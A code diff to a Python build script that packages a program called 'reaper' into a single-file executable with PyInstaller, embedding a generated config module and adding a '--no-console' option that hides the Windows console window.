@@ -24,16 +24,20 @@ def build(args: argparse.Namespace) -> None:
             value = value if not isinstance(value, str) else f"'{value}'"
             config_file.write(f"{key} = {value}\n")
 
-    name = args.name if args.name is not None else f"{system().lower()}_reaper"
+    file_name = args.name if args.name is not None else \
+        f"{system().lower()}_reaper"
 
     cmd = [
         "src/reaper.py", "--onefile",
         "--hidden-import", "config",
-        "--name", name
+        "--name", file_name
     ]
 
     if args.dest_dir is not None:
         cmd.append(args.dest_dir)
+
+    if args.no_console is True:
+        cmd.append("--noconsole")
 
     pyinstaller.run(cmd)
 
@@ -53,6 +57,12 @@ if __name__ == "__main__":
         type=str,
         help="Absolute path to a directory to write the binary file. Defaults "
              "to ./dist if unset."
+    )
+    _args.add_argument(
+        "--no-console",
+        action="store_true",
+        help="Set to prevent Windows from opening a console during execution "
+             "of the application."
     )
 
     build(_args.parse_args())
